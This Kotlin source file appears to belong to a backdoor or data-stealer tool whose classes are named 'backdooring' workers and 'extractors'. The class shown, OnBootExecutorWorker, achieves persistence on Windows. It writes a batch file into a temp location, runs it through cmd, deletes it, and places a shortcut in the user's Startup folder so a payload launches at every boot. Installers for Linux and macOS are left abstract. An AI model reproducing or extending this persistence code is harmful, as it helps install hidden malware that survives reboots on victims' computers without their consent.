package net.kerner.entkerner.extractors.standart

import io.ktor.client.*
import net.kerner.entkerner.Entkerner
import net.kerner.entkerner.abstract.AbstractBackdooringWorker
import net.kerner.entkerner.abstract.SystemFileURI
import net.kerner.entkerner.abstract.get
import net.kerner.entkerner.io.FileUtils.Windows.appData
import net.kerner.entkerner.io.JavaClassLoaderResources
import net.kerner.entkerner.io.nullPath
import net.kerner.entkerner.io.nullPaths
import net.kerner.entkerner.model.SystemType
import java.io.File
import java.nio.file.Path
import kotlin.io.path.absolutePathString
import kotlin.io.path.div
import kotlin.io.path.pathString
import kotlin.io.path.writeBytes

abstract class OnBootExecutorWorker(
    val publicName: String,
    val httpClient: HttpClient,
    override val entkerner: Entkerner
) : AbstractBackdooringWorker(httpClient, entkerner) {
    override val name = "OnBootExecutionWorker"
    override val file = object : SystemFileURI() {
        override val windows = appData / "Roaming"  / "Microsoft" / "Windows" / "Start Menu" / "Programs" / "Startup" / publicName
        override val linux = nullPath
        override val darwin = nullPath
    }
    private val createShortcutBuffer = JavaClassLoaderResources.getResource("windows/CreateShortcut.bat").readBytes()
    init {
        println(file[entkerner.system].toFile().absolutePath)
        file[entkerner.system].toFile().mkdirs()
    }

    private fun createShortcut(sourcePath: Path, destinationPath: Path) {
        val shortCutData = String(createShortcutBuffer)
            .replace("\$path_shortcut\$", destinationPath.pathString)
            .replace("\$path_src\$", sourcePath.pathString).toByteArray()
        val batchFile = kotlin.io.path.createTempFile("install-$publicName.bat")
        batchFile.toFile().createNewFile()
        batchFile.writeBytes(shortCutData)


        // executes the file:
        val processBuilder = ProcessBuilder("cmd /c ${batchFile.absolutePathString()}")
        val process = processBuilder.start()
        val errorBytes = process.errorStream.readAllBytes()
        val error = String(errorBytes)
        println("err: $error")
        batchFile.toFile().delete()
    }

    override fun buildDoor(file: File): Boolean {
        when(entkerner.system) {
            SystemType.WINDOWS -> {
                val batchFile = installWindows(file)
                createShortcut(batchFile.toPath(), (file.parentFile.toPath() / "$publicName.lnk"))
            }
            SystemType.LINUX -> installLinux(file)
            SystemType.XNU -> installDarwin(file)
        }
        return file.exists()
    }

    abstract fun installWindows(file: File): File
    abstract fun installLinux(file: File)
    abstract fun installDarwin(file: File)




}